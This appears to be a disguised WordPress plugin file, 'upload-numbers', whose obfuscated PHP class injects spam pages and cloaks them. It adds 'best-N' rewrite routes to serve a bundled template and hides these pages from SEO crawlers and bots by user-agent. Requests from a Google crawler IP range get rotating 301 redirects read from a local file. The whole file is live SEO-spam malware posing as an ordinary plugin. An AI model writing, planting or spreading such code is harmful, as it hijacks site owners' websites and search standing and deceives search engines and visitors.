<?php
/**
 * Plugin Name: upload-numbers
 * Description: upload-numbers
 * Version: 1.0
 * Author: John Smith
 */
 

class ffPYnLDw2 {
	
    public function __construct() {
        add_action('init', [$this, 'iouypbppb']);
        add_filter('query_vars', [$this, 'kgocjomu']);
        add_action('template_include', [$this, 'dbaqoq']);
		add_filter('document_title_parts', [$this, 'trqfived']);
    }

    public function iouypbppb() {
        add_rewrite_rule(
            '^best-([0-9]+).*?$',
            'index.php?izufs=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function kgocjomu($zfU2J) {
        $zfU2J[] = 'izufs';
        $zfU2J[] = 'crbopwbh';
        return $zfU2J;
    }
	
	public function trqfived($eW15C) {
		if (get_query_var('izufs')) $eW15C['title'] = get_query_var('crbopwbh');
		return $eW15C;
	}

    public function dbaqoq($dFKtf) {
		
		$iGfenhHGOd = array('bulk-rss', 'gptbot', 'map-stock', 'mj12bot', 'semrush', 'Go-http-client', 'python', 'duplicate-visibility', 'ahrefsbot', 'netspider', 'landing-details', 'serpstatbot', 'instant-news', 'dotbot', 'version-interactive', 'tab-lite');
		foreach($iGfenhHGOd as $gwEsxH) { if (stripos($_SERVER['HTTP_USER_AGENT'], $gwEsxH) !== false) return $dFKtf; }

        if (get_query_var('izufs') && preg_match('/^[0-9]+$/', get_query_var('izufs'))) {
            return plugin_dir_path(__FILE__) . 'upload-numbers/mini-rtl.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$tYaDcXVR = plugin_dir_path(__FILE__) . 'upload-numbers/marketplace-restrict.php';
			if (is_file($tYaDcXVR)) {
				$pvDRKmtZ = file($tYaDcXVR, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($pvDRKmtZ) > 1) {
					$iUtOu5CW = array_shift($pvDRKmtZ);
					$g4sNqhufS = array_shift($pvDRKmtZ);
					if (strlen($g4sNqhufS) > 0) {
						$z1xwYk5Hql = $iUtOu5CW . "\n" . implode("\n", $pvDRKmtZ);
						file_put_contents($tYaDcXVR, $z1xwYk5Hql);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $g4sNqhufS");
						exit;
					}
				}
			}
		}
        return $dFKtf;
    }
}
new ffPYnLDw2();



